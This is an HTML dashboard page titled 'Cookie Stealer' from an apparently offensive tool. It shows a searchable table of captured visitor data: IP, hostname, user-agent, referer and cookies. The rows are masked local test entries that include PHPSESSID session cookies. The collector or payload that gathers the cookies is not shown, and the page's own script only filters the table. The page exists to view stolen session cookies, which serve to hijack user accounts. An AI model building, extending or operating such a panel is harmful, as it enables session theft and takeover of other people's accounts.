<!doctype html>
<html lang="en">
  <head>
    <title>--</title>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <style>
    html,body { 
	height: 100%; 
}

/* Hide scrollbar for Chrome, Safari and Opera */
.hidden::-webkit-scrollbar {
  display: none;
}

/* Hide scrollbar for IE and Edge */
.hidden {
  -ms-overflow-style: none;
}


.global-container{
	height:100%;
	display: flex;
	align-items: center;
	justify-content: center;
	background-color: #f5f5f5;
}

form{
	padding-top: 10px;
	font-size: 14px;
	margin-top: 30px;
}

.card-title{ font-weight:300; }

.btn{
	font-size: 14px;
	margin-top:20px;
}


.login-form{ 
	width:330px;
	margin:20px;
}

.sign-up{
	text-align:center;
	padding:20px 0 0;
}

.alert{
	margin-bottom:-30px;
	font-size: 13px;
	margin-top:20px;
}

#searchText {
  background-image: url('https://www.w3schools.com/css/searchicon.png');
  background-position: 10px 10px;
  background-repeat: no-repeat;
  width: 100%;
  font-size: 16px;
  padding: 12px 20px 12px 40px;
  border: 1px solid #ddd;
  margin-bottom: 12px;
}

#me {
  color: chocolate;
}
#me:hover {
  color: coral;
  cursor: pointer;
}
  </style>
    <!-- Jquery -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous"></script>
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
  </head>
<body>

<div class="container mt-5">
  <div class="row mt-5">
    <div class="col-12 col-lg-8">
      <h1 class="display-4">Cookie Stealer</h1>
    </div>
    <div class="col-12 col-lg-4">
      <p class="lead float-right" id="me" onclick="git()">made with ❣ by Ihsan Devs</p>
    </div>
    <div class="col-12 mt-4">
      <form class="form">
        <input type="text" id="searchText"placeholder="Cari Data Disini...">
      </form>
    </div>
  </div>

<div class="hidden">
<table class="table table-bordered table-hover table-inverse table-responsive table table-sm search-table">
<thead class="bg-dark">
<tr class="text-light text-center">
<td>IP</td>
<td>Host</td>
<td>User-Agent</td>
<td>Date</td>
<td>Time</td>
<td>Referer</td>
<td>Cookie</td>
</tr>
</thead>

<tbody id="searchTable">
<tr>
<td>::1</td><td>DESKTOP-XXXXXXXXX</td>
<td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56</td>
<td>10/05/2021</td>
<td>02:44:47</td>
<td>http://localhost/php_scrapp/test.php</td>
<td
>_gcl_au=1.1.50743562.XXXXXXXXX; _ga=GA1.1.516441491.XXXXXXXXXXXX; _gid=GA1.1.XXXXXXXXXXX.1620522248</td>
</tr>
<tr>
<td>::1</td>
<td>DESKTOP-XXXXXXXXXX</td>
<td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56</td>
<td>10/05/2021</td>
<td>03:47:04</td>
<td>http://localhost/php_scrapp/test.php</td>
<td>PHPSESSID=XXXXXXXXXXXXXXXX</td>
</tr>
<tr>
<td>::1</td>
<td>DESKTOP-XXXXXXXXXX</td>
<td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56</td>
<td>10/05/2021</td>
<td>03:47:57</td>
<td>http://localhost/php_scrapp/test.php</td>
<td>PHPSESSID=XXXXXXXXXXXXXXXXXXXXX</td>
</tr>
<!-- Breakpoint -->
</tbody>
</table>
</div>
<script>
$(document).ready(function(){
    $("#searchText").keyup(function(){
        _this = this;
          $.each($("#searchTable tr"), function() {
             if($(this).text().toLowerCase().indexOf($(_this).val().toLowerCase()) === -1){
                 $(this).hide();
               }else{
                 $(this).show();
              }
          });
    });
});

function git() {
  window.location.href = "https://github.com/IhsanDevs";
}
</script>
</body>
</html>